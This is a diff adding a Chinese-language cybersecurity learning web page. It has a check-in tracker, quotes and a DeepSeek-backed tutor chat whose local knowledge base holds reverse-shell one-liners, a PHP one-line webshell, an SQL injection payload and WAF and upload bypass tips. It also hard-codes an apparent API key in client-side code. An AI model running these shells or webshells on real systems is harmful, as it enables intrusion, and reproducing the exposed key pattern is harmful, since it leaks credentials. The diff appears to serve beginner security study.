+      <h2>🌍 英文资讯</h2>
+      <div class="btns">
+        <a href="https://thehackernews.com/" target="_blank" class="btn btn-primary">The Hacker News</a>
+        <a href="https://krebsonsecurity.com/" target="_blank" class="btn btn-blue">Krebs on Security</a>
+        <a href="https://www.exploit-db.com/" target="_blank" class="btn btn-purple">Exploit-DB</a>
+        <a href="https://cve.mitre.org/" target="_blank" class="btn btn-outline">CVE 官网</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2>💬 社区</h2>
+      <div class="btns">
+        <a href="https://www.reddit.com/r/netsec/" target="_blank" class="btn btn-orange">Reddit netsec</a>
+      </div>
+    </div>
+    <div class="card">
+      <h2>📡 CVE</h2>
+      <p style="font-size:.82em;color:var(--text2);margin-bottom:8px;">查询最新漏洞</p>
+      <a href="https://nvd.nist.gov/vuln/search/results?isAdvanced=true&results_type=overview&search_type=all&pub_start_date=2026-05-01" target="_blank" class="btn btn-primary btn-sm">NVD 漏洞数据库 →</a>
+    </div>
+  </div>
+</section>
+
+</main><div class="chat-panel open" id="chatPanel"><div class="chat-header" id="chatDragHandle">🤖 AI 安全导师（DeepSeek）<div><button class="btn-icon" onclick="clearChat()" title="清空对话">🗑️</button></div></div><div class="chat-messages" id="chatMessages"><div class="chat-msg bot">👋 你好！我是你的AI安全导师。<br>问任何安全问题，我会给你详细解答。</div></div><div class="chat-typing" id="chatTyping">🤔 思考中...</div><div class="suggestions" id="suggestions"><button onclick="askQuestion('SQL注入是什么')">SQL注入</button><button onclick="askQuestion('反弹Shell怎么做')">反弹Shell</button><button onclick="askQuestion('CTF怎么入门')">CTF入门</button><button onclick="askQuestion('Kali Linux是什么')">Kali Linux</button><button onclick="askQuestion('什么是水坑攻击')">水坑攻击</button><button onclick="askQuestion('怎么搭建DVWA')">搭DVWA</button></div><div class="chat-input-area"><input type="text" id="chatInput" placeholder="输入问题，回车发送..." onkeydown="if(event.key==='Enter')sendMessage()"><button onclick="sendMessage()">➤</button></div></div>
+
+<script>
+// ============ 数据 ============
+const STORAGE_KEY = 'hacker_hub_data';
+function getData() {
+  try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || { checkins:{},notes:[],streak:0,lastCheckin:null }; }
+  catch(e) { return { checkins:{},notes:[],streak:0,lastCheckin:null }; }
+}
+function saveData(d) { localStorage.setItem(STORAGE_KEY, JSON.stringify(d)); }
+
+// ============ 纯网络安全知识金句（无戒色内容） ============
+const quotes = [
+  { t:'零日漏洞不是你发现不了的那些，是你从未检查过的那些。', a:'安全圈名言' },
+  { t:'最好的防御是理解攻击者的思维方式。', a:'Kevin Mitnick' },
+  { t:'安全不是产品，而是一个持续的过程。', a:'Bruce Schneier' },
+  { t:'在网络安全领域，你唯一不变的朋友是持续学习。', a:'安全圈名言' },
+  { t:'漏洞不是缺陷，是一种未被记录的特性。', a:'安全圈名言' },
+  { t:'渗透测试的本质：用攻击者的眼光看系统。', a:'安全圈名言' },
+  { t:'信息安全的第一条规则：不要信任任何输入。', a:'OWASP' },
+  { t:'会攻击的是脚本小子，懂防御的才是安全工程师。', a:'安全圈名言' },
+  { t:'捷径是最大的弯路。把每一条HTTP请求看懂，把每一个响应头弄明白。', a:'安全圈名言' },
+  { t:'你花了多少时间在靶场上，你的技术就有多扎实。', a:'安全圈名言' },
+  { t:'CTF不是为了拿奖，是为了逼自己在规定时间里学会新东西。', a:'安全圈名言' },
+  { t:'网络安全的本质是信息对抗。你掌握的信息比别人多，你就赢了。', a:'安全圈名言' },
+  { t:'不要急着学漏洞利用，先把正常的请求和响应看懂。', a:'安全圈名言' },
+  { t:'每一个大黑客都是从"ls和cd都分不清"开始的。', a:'安全圈名言' },
+  { t:'学习安全最好的方式：建一个环境，然后尝试攻破它。', a:'安全圈名言' },
+  { t:'安全人员最稀缺的能力不是懂多少漏洞，而是能独立分析未知系统。', a:'安全圈名言' },
+  { t:'代码审计的核心不是找Bug，是读懂别人的思路。', a:'安全圈名言' },
+  { t:'You don\'t learn to hack, you hack to learn.', a:'安全圈名言' },
+  { t:'TCP三次握手你都说不清楚，就别急着学内网渗透。', a:'安全圈名言' },
+  { t:'SQL注入的本质不是构造payload，是理解SQL语句的执行逻辑。', a:'安全圈名言' },
+  { t:'反弹Shell不是目的，是进入系统后的第一步。后续的提权和横向移动才是主菜。', a:'安全圈名言' },
+  { t:'所有复杂攻击的底层原理，都能在OSI七层模型里找到对应。', a:'安全圈名言' },
+  { t:'漏洞有生命周期，但协议不会。学透TCP/IP比背一百个CVE有用。', a:'安全圈名言' },
+  { t:'最危险的漏洞不是0day，是运维不补的已知漏洞。', a:'安全圈名言' },
+  { t:'渗透测试中70%的时间花在信息收集上。OSINT（开源情报）是第一步。', a:'安全圈名言' },
+];
+
+function showQuote() {
+  const today = new Date();
+  const idx = (today.getFullYear()*10000+(today.getMonth()+1)*100+today.getDate()) % quotes.length;
+  const q = quotes[idx];
+  document.getElementById('daily-quote').innerHTML =
+    '<div class="quote-text">💡 "'+q.t+'"</div><div class="quote-author">—— '+q.a+'</div>';
+}
+
+// ============ 安全快讯 ============
+const sampleNews = [
+  { t:'2026年5月安全趋势：AI驱动的网络攻击持续增长，防御方加速AI自动化响应', d:'05-25' },
+  { t:'警惕针对高校的钓鱼邮件：攻击者利用"考研内部资料"作为诱饵', d:'05-24' },
+  { t:'OWASP发布LLM应用安全Top 10，提示注入攻击位居榜首', d:'05-22' },
+  { t:'新发现：Redis未授权访问可被用于云环境横向移动攻击链', d:'05-20' },
+  { t:'微软5月安全更新修复3个已遭利用的0day漏洞', d:'05-18' },
+];
+function showNews() {
+  let h='';
+  sampleNews.forEach(n=>{h+='<div class="news-item">🔹 '+n.t+' <span style="color:var(--text2);font-size:.78em;">'+n.d+'</span></div>';});
+  document.getElementById('daily-news').innerHTML=h;
+}
+
+// ============ 打卡 ============
+function getToday() { return new Date().toISOString().slice(0,10); }
+function doCheckin() {
+  const d=getData(); const t=getToday();
+  if(d.checkins[t]){ document.getElementById('today-status').textContent='✅ 今日已打卡'; return; }
+  d.checkins[t]=true;
+  let s=1; const dt=new Date(t);
+  while(true){ dt.setDate(dt.getDate()-1); const ds=dt.toISOString().slice(0,10); if(d.checkins[ds])s++; else break; }
+  d.streak=s; d.lastCheckin=t; saveData(d);
+  refreshHome(); document.getElementById('today-status').textContent='✅ 打卡成功！';
+}
+function refreshHome() {
+  const d=getData(); const t=getToday();
+  document.getElementById('streak-count').textContent=d.streak||0;
+  if(d.checkins[t]){ document.getElementById('btn-checkin').textContent='✅ 今日已打卡'; document.getElementById('btn-checkin').style.opacity='0.6'; }
+  else { document.getElementById('btn-checkin').textContent='✅ 今日打卡'; document.getElementById('btn-checkin').style.opacity='1'; }
+  const n=new Date(); const y=n.getFullYear(); const m=n.getMonth();
+  const dim=new Date(y,m+1,0).getDate();
+  let cal='';
+  for(let i=1;i<=dim;i++){
+    const ds=y+'-'+String(m+1).padStart(2,'0')+'-'+String(i).padStart(2,'0');
+    const ok=d.checkins[ds];
+    cal+='<span class="checkin-day '+(ok?'checkin-done':'checkin-miss')+'" title="'+ds+'">'+i+'</span>';
+  }
+  document.getElementById('cal-view').innerHTML=cal;
+  const notes=(d.notes||[]).slice(-5).reverse();
+  let nh='';
+  notes.forEach(n=>{nh+='<div style="padding:5px 0;border-bottom:1px solid var(--border);font-size:.82em;"><strong style="color:var(--accent2)">'+n.date+'</strong><br>'+n.content.substring(0,100)+'</div>';});
+  document.getElementById('recent-notes').innerHTML=nh||'<span style="color:var(--text2);font-size:.82em;">暂无笔记，开始写第一条吧</span>';
+}
+function saveNote() {
+  const input=document.getElementById('note-input');
+  const c=input.value.trim(); if(!c) return;
+  const d=getData(); d.notes.push({date:getToday(),content:c});
+  saveData(d); input.value='';
+  document.getElementById('note-saved').textContent='✅ 已保存';
+  setTimeout(()=>document.getElementById('note-saved').textContent='',2000);
+  refreshHome();
+}
+
+// ============ 导航 ============
+function showSection(name) {
+  document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
+  document.querySelectorAll('#nav a').forEach(a=>a.classList.remove('active'));
+  const sec=document.getElementById('section-'+name);
+  if(sec) sec.classList.add('active');
+  const nl=document.querySelector('#nav a[href="#'+name+'"]');
+  if(nl) nl.classList.add('active');
+  if(name==='home') refreshHome();
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+window.addEventListener('hashchange',()=>{
+  const h=location.hash.replace('#','');
+  if(h) showSection(h);
+});
+if(location.hash){ const h=location.hash.replace('#','');if(h)showSection(h); }
+
+
+
+// ============ Panel Drag to Move ============
+(function(){
+  const panel=document.getElementById("chatPanel");
+  const dragHandle=document.getElementById("chatDragHandle");
+  if(!panel||!dragHandle) return;
+  let dragging=false, startX,startY,startLeft,startTop;
+  dragHandle.addEventListener("mousedown",function(e){
+    if(e.target.closest("button")) return; // Don't drag when clicking buttons
+    dragging=true; startX=e.clientX; startY=e.clientY;
+    startLeft=panel.offsetLeft; startTop=panel.offsetTop;
+    document.body.style.cursor="grabbing";
+    document.body.style.userSelect="none";
+    e.preventDefault();
+  });
+  document.addEventListener("mousemove",function(e){
+    if(!dragging) return;
+    var nx=startLeft+(e.clientX-startX);
+    var ny=startTop+(e.clientY-startY);
+    nx=Math.max(0,Math.min(window.innerWidth-panel.offsetWidth,nx));
+    ny=Math.max(0,Math.min(window.innerHeight-60,ny));
+    panel.style.left=nx+"px";
+    panel.style.top=ny+"px";
+    panel.style.right="auto";
+  });
+  document.addEventListener("mouseup",function(){
+    if(!dragging) return;
+    dragging=false;
+    document.body.style.cursor="";
+    document.body.style.userSelect="";
+  });
+})();
+showQuote(); showNews(); refreshHome();
+
+// ============ AI 问答 ============
+function togglePanel() {
+  const p=document.getElementById("chatPanel");
+  p.classList.toggle("open");
+}
+
+function addMsg(text, type) {
+  const msgs=document.getElementById('chatMessages');
+  const d=document.createElement('div');
+  d.className='chat-msg '+type; d.innerHTML=text;
+  msgs.appendChild(d); msgs.scrollTop=msgs.scrollHeight;
+}
+
+const KB = {
+  'sql注入':'<b>SQL注入 (SQL Injection)</b><br>攻击者通过在输入框中插入恶意SQL语句，欺骗数据库执行非预期操作。<br><br>🔍 <b>原理</b>：用户输入被直接拼接到SQL查询中<br>💉 <b>举例</b>：<code>admin\' OR \'1\'=\'1</code><br>🛡️ <b>防御</b>：参数化查询、ORM框架、输入过滤<br>🎯 <a href="https://portswigger.net/web-security/sql-injection" target="_blank" style="color:var(--accent)">→ PortSwigger Lab 练习</a>',
+  'xss':'<b>XSS 跨站脚本攻击</b><br>向网页注入恶意JavaScript代码，在受害者浏览器中执行。<br><br>📋 <b>三种类型</b>：反射型、存储型、DOM型<br>🛡️ <b>防御</b>：输出编码、CSP策略、HttpOnly Cookie',
+  'ssrf':'<b>SSRF 服务端请求伪造</b><br>利用服务器发起对内网的请求，绕过防火墙访问内部系统。<br><br>🎯 <b>常见目标</b>：云元数据服务(<code>169.254.169.254</code>)、内网服务<br>🛡️ <b>防御</b>：URL白名单、禁用内网请求、协议限制',
+  '反弹shell':'<b>反弹Shell (Reverse Shell)</b><br>目标机主动连接攻击机，把命令行权限"反弹"出来。<br><br>📝 <b>常用方法</b>：<br>• Bash: <code>bash -i >& /dev/tcp/IP/PORT 0>&1</code><br>• Python: <code>python -c \'import socket...\'</code><br>• NC: <code>nc -e /bin/sh IP PORT</code><br>🔧 <a href="https://www.revshells.com/" target="_blank" style="color:var(--accent)">→ 在线反弹Shell生成器</a>',
+  'kali':'<b>Kali Linux</b><br>最流行的渗透测试操作系统，内置600+安全工具。<br><br>🔧 <b>核心工具</b>：Nmap、Burp Suite、Metasploit、Wireshark、John the Ripper<br>💿 <b>下载</b>：<a href="https://www.kali.org/get-kali/" target="_blank" style="color:var(--accent)">kali.org</a><br>📌 <b>安装</b>：在VMware中创建虚拟机，加载Kali ISO即可<br>⚠️ 仅用于授权的安全测试和学习！',
+  'ctf入门':'<b>CTF (Capture The Flag) 入门指南</b><br>网络安全夺旗赛，分五大方向：<br><br>🌐 <b>Web</b>：网站漏洞（SQL/XSS/SSRF）<br>🔧 <b>Pwn</b>：二进制漏洞利用<br>🔍 <b>Reverse</b>：逆向工程<br>🔐 <b>Crypto</b>：密码学<br>📁 <b>Misc</b>：杂项<br><br>🎮 <b>新手平台</b>：BUUCTF → NSSCTF → CTFHub<br>📖 <b>教程</b>：ctf-wiki.org',
+  'dvwa':'<b>DVWA (Damn Vulnerable Web Application)</b><br>经典Web安全入门靶场。<br><br>📦 <b>环境要求</b>：PHP + MySQL + Apache/Nginx<br>🔧 <b>搭建方法</b>：<br>1. 装 XAMPP 或 PHPStudy<br>2. 从 GitHub 下载 DVWA<br>3. 放到 web 目录，配置数据库<br>4. 访问 http://localhost/dvwa<br><br>🎯 包含 SQL注入/XSS/CSRF/文件上传等10种漏洞<br>⭐ 新手更推荐 <b>Pikachu靶场</b>（有中文提示）',
+  '水坑攻击':'<b>水坑攻击 (Watering Hole Attack)</b><br>攻击者分析目标的浏览习惯，在目标常访问的合法网站上植入恶意代码。<br><br>📋 <b>攻击流程</b>：<br>1. 侦察目标群体喜好<br>2. 入侵目标常访问的合法网站<br>3. 植入恶意JS/漏洞利用代码<br>4. 等待目标访问→自动感染<br><br>🛡️ <b>防御</b>：浏览器沙箱、及时更新软件、虚拟化隔离<br>🔗 <a href="https://attack.mitre.org/techniques/T1189/" target="_blank" style="color:var(--accent)">MITRE ATT&CK T1189 →</a>',
+  'python':'<b>Python 在安全领域的应用</b><br>网络安全最常用的脚本语言。<br><br>🔧 <b>常见用途</b>：<br>• 编写POC/EXP（漏洞利用脚本）<br>• 自动化渗透测试<br>• 编写扫描器/爬虫<br>• CTF解题（Pwntools等）<br>• 恶意软件分析<br><br>📖 推荐看黑马Python教程（B站600集）',
+  'nmap':'<b>Nmap 端口扫描器</b><br>网络发现和安全审计的事实标准工具。<br><br>📝 <b>常用命令</b>：<br>• <code>nmap -sV 目标IP</code> — 服务版本探测<br>• <code>nmap -sC 目标IP</code> — 默认脚本扫描<br>• <code>nmap -p- 目标IP</code> — 全端口扫描<br>• <code>nmap -O 目标IP</code> — 操作系统检测',
+  'vmware':'<b>VMware Workstation</b><br>最流行的虚拟机软件，用于创建隔离的测试环境。<br><br>💡 <b>安全学习必备</b>：<br>• 在虚拟机里装Kali Linux（攻击机）<br>• 再装一个靶机（Ubuntu/Windows）<br>• 两台虚拟机组成安全实验室<br>• 快照功能随时恢复初始状态<br>⚠️ 不要在宿主机上测试恶意软件',
+  'burpsuite':'<b>Burp Suite</b><br>Web渗透测试必备的抓包改包工具。<br><br>🔧 <b>核心功能</b>：<br>• <b>Proxy</b>：拦截HTTP请求，查看修改数据<br>• <b>Repeater</b>：重复发送修改后的请求<br>• <b>Intruder</b>：自动化暴力破解/参数fuzz<br>• <b>Decoder</b>：编解码工具<br><br>💿 免费版已够新手使用<br>📌 需配置浏览器代理为 127.0.0.1:8080',
+  'linux':'<b>Linux 基础命令</b><br>安全从业者的必备技能。<br><br>📝 <b>新手必学命令</b>：<br>• <code>ls/cd/pwd/mkdir</code> — 文件管理<br>• <code>cat/grep/find</code> — 文件查找与内容<br>• <code>chmod/chown</code> — 权限管理<br>• <code>nc/curl/wget</code> — 网络工具<br>• <code>ps/kill/top</code> — 进程管理<br><br>🎮 练手：OverTheWire Bandit 闯关游戏',
+  'cve':'<b>CVE (Common Vulnerabilities and Exposures)</b><br>全球通用的漏洞编号系统。<br><br>📋 <b>格式</b>：CVE-年份-序号（如 CVE-2017-0144 = 永恒之蓝）<br>🔍 <b>查询</b>：<a href="https://nvd.nist.gov/" target="_blank" style="color:var(--accent)">NVD 数据库</a><br>📌 每个CVE包含：漏洞描述、影响版本、CVSS评分、修复建议',
+  'owasp':'<b>OWASP Top 10</b><br>全球最权威的Web应用安全风险排名。<br><br>📋 <b>2021版Top 10</b>：<br>1. 访问控制失效<br>2. 加密失败<br>3. 注入攻击<br>4. 不安全设计<br>5. 安全配置错误<br>6. 易受攻击和过时的组件<br>7. 认证失效<br>8. 软件和数据完整性故障<br>9. 安全日志和监控故障<br>10. SSRF',
+  '渗透测试':'<b>渗透测试 (Penetration Testing)</b><br>模拟黑客攻击来评估系统安全性。<br><br>📋 <b>基本流程</b>：<br>1. 信息收集（OSINT、端口扫描）<br>2. 漏洞发现（扫描器+手工）<br>3. 漏洞利用（获取初始访问权限）<br>4. 后渗透（提权、横向移动、持久化）<br>5. 报告编写<br><br>🌱 入门路径：学Linux→学HTTP→搭DVWA→刷CTF',
+  'arp欺骗':'<b>ARP欺骗 (ARP Spoofing)</b><br>局域网攻击技术，伪造ARP响应将流量导向攻击机。<br><br>🔧 <b>工具</b>：Ettercap、arpspoof、BetterCAP<br>🛡️ <b>防御</b>：静态ARP表、ARP检测软件、交换机端口安全',
+  'ddos':'<b>DDoS 分布式拒绝服务攻击</b><br>通过大量请求耗尽目标资源使其无法服务。<br><br>📋 <b>常见类型</b>：<br>• SYN Flood — TCP握手攻击<br>• UDP Flood — 带宽耗尽<br>• HTTP Flood — 应用层攻击<br>• DNS Amplification — 放大攻击<br>🛡️ <b>防御</b>：CDN、流量清洗、WAF、弹性带宽',
+  'csrf':'<b>CSRF 跨站请求伪造</b><br>诱导用户在已登录网站上执行非预期操作。<br><br>💡 <b>场景</b>：你登录了银行网站，打开攻击者发的链接，钱就被转走了<br>🛡️ <b>防御</b>：CSRF Token、SameSite Cookie、Referer验证<br><a href="https://portswigger.net/web-security/csrf" target="_blank" style="color:var(--accent)">→ PortSwigger Lab</a>',
+  '文件上传':'<b>文件上传漏洞</b><br>上传恶意文件（如PHP Webshell）到服务器并执行。<br><br>🔍 <b>绕过技巧</b>：<br>• 修改Content-Type<br>• 双扩展名（shell.php.jpg）<br>• %00截断<br>• .htaccess覆盖<br>🛡️ <b>防御</b>：白名单验证、文件重命名、上传目录禁执行<br><a href="https://github.com/c0ny1/upload-labs" target="_blank" style="color:var(--accent)">→ Upload-Labs 靶场</a>',
+  'webshell':'<b>WebShell</b><br>以网页形式存在的后门程序，通过浏览器控制服务器。<br><br>📝 <b>一句话木马</b>：<code>&lt;?php @eval($_POST[\'cmd\']);?&gt;</code><br>🔧 <b>管理工具</b>：蚁剑、冰蝎、哥斯拉<br>⚠️ WebShell通常需要配合免杀技术绕过WAF和杀软',
+  'metasploit':'<b>Metasploit (MSF)</b><br>最著名的渗透测试框架。<br><br>📝 <b>基本用法</b>：<br>• <code>msfconsole</code> — 启动控制台<br>• <code>search 漏洞名</code> — 搜索模块<br>• <code>use 模块路径</code> — 使用模块<br>• <code>set RHOSTS IP</code> — 设目标<br>• <code>exploit</code> — 执行攻击<br>⚠️ 仅用于授权的安全测试',
+  'waf':'<b>WAF (Web Application Firewall)</b><br>Web应用防火墙，检测和拦截Web攻击。<br><br>🔍 <b>绕WAF技巧</b>：<br>• SQL注入：大小写混写、内联注释、编码绕过<br>• XSS：标签变形、编码<br>• 上传：文件头伪造、分块传输<br>🛡️ <b>常见WAF</b>：CloudFlare、阿里云WAF、长亭SafeLine',
+  'jwttoken':'<b>JWT (JSON Web Token) 攻击</b><br>现代Web应用常见的认证Token机制。<br><br>🔍 <b>常见漏洞</b>：<br>• <code>alg:none</code> 绕过签名<br>• 弱密钥暴力破解<br>• kid参数注入<br>• JWT混淆攻击<br><a href="https://portswigger.net/web-security/jwt" target="_blank" style="color:var(--accent)">→ PortSwigger Lab</a>',
+  'docker':'<b>Docker 容器安全</b><br>容器逃逸是云安全的热门方向。<br><br>🔍 <b>常见攻击</b>：<br>• 特权容器逃逸<br>• Docker Socket挂载滥用<br>• 内核漏洞逃逸<br>• 镜像供应链攻击<br>🛡️ <b>防御</b>：非root运行、只读文件系统、限制Capabilities',
+  '提权':'<b>权限提升 (Privilege Escalation)</b><br>从低权限用户提升到root/administrator。<br><br>🐧 <b>Linux提权</b>：SUID文件、Capabilities、Cron任务、内核漏洞<br>🪟 <b>Windows提权</b>：服务权限、UAC绕过、Token窃取<br>🔗 <a href="https://gtfobins.github.io/" target="_blank" style="color:var(--accent)">GTFOBins →</a> <a href="https://lolbas-project.github.io/" target="_blank" style="color:var(--accent)">LOLBAS →</a>',
+  '信息收集':'<b>信息收集 (Information Gathering)</b><br>渗透测试的第一步，也是最关键的一步。<br><br>🔍 <b>内容</b>：<br>• WHOIS查询、DNS记录<br>• 子域名枚举<br>• 端口扫描（Nmap）<br>• 目录扫描（Dirsearch/Gobuster）<br>• 指纹识别（WhatWeb/Wappalyzer）<br>💡 信息收集占渗透测试70%的时间',
+  'php':'<b>PHP 与 Web安全</b><br>PHP是最常出现在Web安全中的后端语言。<br><br>🔍 <b>PHP常见漏洞</b>：<br>• <code>include()</code> — 文件包含<br>• <code>unserialize()</code> — 反序列化<br>• <code>preg_replace() /e</code> — 代码执行<br>• <code>assert()</code> — 代码执行<br>📌 PHP 7.x/8.x 已修复许多历史问题但旧代码仍大量存在',
+};
+
+function findAnswer(q) {
+  q=q.toLowerCase().replace(/[？?！!]/g,'');
+  for(let k in KB) {
+    if(q.includes(k.toLowerCase())) return KB[k];
+  }
+  // Fuzzy: keyword extraction
+  const words=q.split(/\s+/).filter(w=>w.length>=2);
+  for(let w of words) {
+    for(let k in KB) {
+      if(k.includes(w.toLowerCase())) return KB[k];
+    }
+  }
+  return null;
+}
+
+// ============ DeepSeek API 配置 ============
+const DEEPSEEK_KEY = 'sk-369d92a09f88457bb857a4b6d5f907bb';
+const DEEPSEEK_URL = 'https://api.deepseek.com/chat/completions';
+const SYSTEM_PROMPT = `你是一名资深的网络安全导师和渗透测试专家，专门为0基础学习者提供技术指导。
+
+你的特点：
+1. 用通俗易懂的中文解释复杂的安全概念
+2. 回答中给出具体的命令、代码片段、操作步骤
+3. 推荐合适的学习资源和靶场
+4. 如果问题超出你的知识范围，诚实说不知道并给出查找方向
+5. 始终提醒用户：安全技术仅用于授权的学习和测试
+
+用户目前是大四学生，有C#/Unity基础，正在准备网络安全考研，真正零基础入门安全。你已在他电脑上的 hacker-skill 知识库（50+安全模块）中运行，此网站是他专属的黑客学习平台。
+
+请简短精炼地回答，尽量控制在200字以内，核心知识点可以适当展开。`;
+
+let chatHistory = [];
+
+function askQuestion(q) {
+  document.getElementById('chatInput').value=q;
+  sendMessage();
+}
+
+// 创建流式输出的 bot 消息气泡
+function createStreamMsg() {
+  const msgs=document.getElementById('chatMessages');
+  const d=document.createElement('div');
+  d.className='chat-msg bot'; d.id='streamMsg';
+  d.innerHTML='<span class="stream-cursor">▌</span>';
+  msgs.appendChild(d); msgs.scrollTop=msgs.scrollHeight;
+  return d;
+}
+
+async function sendMessage() {
+  const input=document.getElementById('chatInput');
+  const q=input.value.trim();
+  if(!q) return;
+  addMsg(q,'user'); input.value='';
+  document.getElementById('suggestions').style.display='none';
+  // 显示"思考中"
+  const typing=document.getElementById('chatTyping');
+  typing.innerHTML='🤔 AI 正在思考... <span class="dot-anim"></span>';
+  typing.style.display='block';
+
+  let messages=[{role:'system',content:SYSTEM_PROMPT}];
+  const recent=chatHistory.slice(-10);
+  messages=messages.concat(recent);
+  messages.push({role:'user',content:q});
+
+  try {
+    const resp=await fetch(DEEPSEEK_URL,{
+      method:'POST',
+      headers:{'Content-Type':'application/json','Authorization':'Bearer '+DEEPSEEK_KEY},
+      body:JSON.stringify({model:'deepseek-v4-pro',messages:messages,max_tokens:4096,temperature:0.3,stream:true})
+    });
+    if(!resp.ok){ throw new Error('HTTP '+resp.status); }
+
+    // 创建流式气泡
+    const streamDiv=createStreamMsg();
+    typing.style.display='none';
+    let fullReply='';
+    let reasoning='';
+
+    const reader=resp.body.getReader();
+    const decoder=new TextDecoder();
+    let buffer='';
+
+    while(true){
+      const {done,value}=await reader.read();
+      if(done) break;
+      buffer+=decoder.decode(value,{stream:true});
+      // 解析 SSE 行
+      const lines=buffer.split('\n');
+      buffer=lines.pop()||''; // 不完整的最后一行保留到下次
+      for(const line of lines){
+        if(!line.startsWith('data: ')) continue;
+        const jsonStr=line.slice(6).trim();
+        if(jsonStr==='[DONE]') continue;
+        try{
+          const chunk=JSON.parse(jsonStr);
+          const delta=chunk.choices[0].delta;
+          // 推理内容（R1模式）
+          if(delta.reasoning_content){
+            reasoning+=delta.reasoning_content;
+            streamDiv.innerHTML='<details style="font-size:.8em;color:var(--text2);margin-bottom:4px;"><summary>🧠 推理过程</summary><p>'+escapeHtml(reasoning).replace(/\n/g,'<br>')+'</p></details>'+escapeHtml(fullReply).replace(/\n/g,'<br>')+'<span class="stream-cursor">▌</span>';
+          }
+          // 正常内容
+          if(delta.content){
+            fullReply+=delta.content;
+            let html=escapeHtml(fullReply).replace(/\n/g,'<br>');
+            streamDiv.innerHTML=(reasoning?'<details style="font-size:.8em;color:var(--text2);margin-bottom:4px;"><summary>🧠 推理过程</summary><p>'+escapeHtml(reasoning).replace(/\n/g,'<br>')+'</p></details>':'')+html+'<span class="stream-cursor">▌</span>';
+          }
+        }catch(e){}
+      }
+      streamDiv.parentElement.scrollTop=streamDiv.parentElement.scrollHeight;
+    }
+    // 去掉光标，最终格式化
+    let display=fullReply;
+    // 代码块格式化
+    display=display.replace(/```(\w*)\n?([\s\S]*?)```/g,'<pre style="background:var(--surface);padding:8px;border-radius:6px;overflow-x:auto;font-size:.8em;"><code>$2</code></pre>');
+    display=display.replace(/\n/g,'<br>');
+    streamDiv.innerHTML=(reasoning?'<details style="font-size:.8em;color:var(--text2);margin-bottom:4px;"><summary>🧠 推理过程</summary><p>'+escapeHtml(reasoning).replace(/\n/g,'<br>')+'</p></details>':'')+display;
+    streamDiv.removeAttribute('id');
+
+    chatHistory.push({role:'user',content:q});
+    chatHistory.push({role:'assistant',content:fullReply});
+  } catch(e) {
+    typing.style.display='none';
+    const streamDiv=document.getElementById('streamMsg');
+    if(streamDiv) streamDiv.remove();
+    console.error(e);
+    const ans=findAnswer(q);
+    if(ans){ addMsg(ans+'<br><br><span style="color:var(--text2);font-size:.75em;">（API连接失败，使用了本地知识库）</span>','bot'); }
+    else { addMsg('⚠️ API 连接失败（'+e.message+'）。<br><br>请检查：<br>1. 网络是否能访问 api.deepseek.com<br>2. API Key 是否有效<br>3. 账户余额是否充足<br><br>已自动回退到本地知识库。','bot'); }
+  }
+  typing.style.display='none';
+  document.getElementById('suggestions').style.display='flex';
+}
+
+function escapeHtml(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+// 清空历史按钮
+function clearChat() {
+  chatHistory=[];
+  document.getElementById('chatMessages').innerHTML='<div class="chat-msg bot">👋 对话已重置！我是你的AI安全导师，有什么想问的？</div>';
+}
+
+// ============ Tooltip初始化：给所有带专业名词的按钮加提示 ============
+(function addTooltips() {
+  const tips={
+    'VMware':'虚拟机软件。在电脑上创建一个隔离的操作系统环境，安全学习必备——所有渗透测试都应在虚拟机中进行。',
+    'Kali Linux':'黑客专用Linux发行版。预装600+渗透测试工具（Nmap/Burp/Metasploit等），是安全从业者的标准操作系统。',
+    'Burp Suite':'Web渗透测试核心工具。可以拦截和修改浏览器与服务器之间的HTTP请求，是Web安全的第一工具。',
+    'Wireshark':'网络协议分析工具。捕获网卡上流经的所有数据包，用于分析网络协议和排查问题。',
+    'VS Code':'微软开发的免费代码编辑器。支持丰富插件，Python/PHP/JavaScript开发首选。',
+    'OverTheWire Bandit':'Linux命令行闯关游戏。通过解决每一关的谜题学习Linux命令，适合零基础新手边玩边学。',
+    'HTTPBin':'HTTP请求实验平台。你发什么请求它就返回什么，用来理解HTTP协议和测试请求头。',
+    'MDN':'Mozilla开发者网络。Web技术最权威的参考文档，HTML/CSS/JavaScript标准教材。',
+    'CyberChef':'万能在线编解码工具。支持Base64/Hex/URL/Binary等数百种格式互转，CTF必备。',
+    'BUUCTF':'国内最大的CTF在线题库平台。支持在线环境一键启动，无需自己搭靶场。',
+    'NSSCTF':'新手友好的CTF平台。每道题配有详细WriteUp（解题报告），适合入门学习。',
+    'CTFHub':'按"技能树"分类的CTF练习平台。从基础到高阶，逐级训练。',
+    'Pikachu':'最推荐新手的Web靶场。每个漏洞有中文解释和"提示"按钮，比DVWA更适合0基础。',
+    'DVWA':'经典PHP靶场。包含SQL注入/XSS/CSRF/文件上传等漏洞，难度可调（Low/Medium/High）。',
+    'SQLi-Labs':'65关SQL注入专项训练靶场。从GET型注入到盲注，全面覆盖SQL注入各种场景。',
+    'HackTheBox':'全球最大的在线渗透测试平台。提供真实场景的虚拟机供攻击练习，高级玩家聚集地。',
+    'VulnHub':'免费虚拟机靶场下载站。下载镜像后在本地VMware中练习，无需联网。',
+    'TryHackMe':'交互式安全学习平台。通过浏览器内的虚拟机完成各种安全挑战，适合初中级。',
+    'Upload-Labs':'文件上传漏洞专项靶场。从简单绕过到高级免杀，全面学习上传漏洞的攻防。',
+    'GTFOBins':'Linux系统自带命令的提权速查手册。列出了各种可用来绕过权限限制的系统命令。',
+    'LOLBAS':'Windows系统自带程序的利用速查表。列出可以执行恶意操作的系统自带exe/dll。',
+    'CVE':'公共漏洞和暴露。全球统一的漏洞编号系统，如CVE-2017-0144就是永恒之蓝。',
+    'NVD':'美国国家漏洞数据库。可以查询所有已公布的CVE漏洞详细信息。',
+    'FreeBuf':'国内最大的网络安全资讯平台。汇聚安全新闻、技术文章和行业动态。',
+    '安全客':'360旗下的安全技术社区。发布漏洞分析、安全研究和实战文章。',
+    '先知社区':'阿里云安全技术社区。白帽子提交漏洞和技术分享的平台。',
+    'Seebug Paper':'知道创宇出品的安全技术博客。深度的漏洞分析和安全研究文章。',
+  };
+  document.querySelectorAll('a.btn, button.btn').forEach(btn=>{
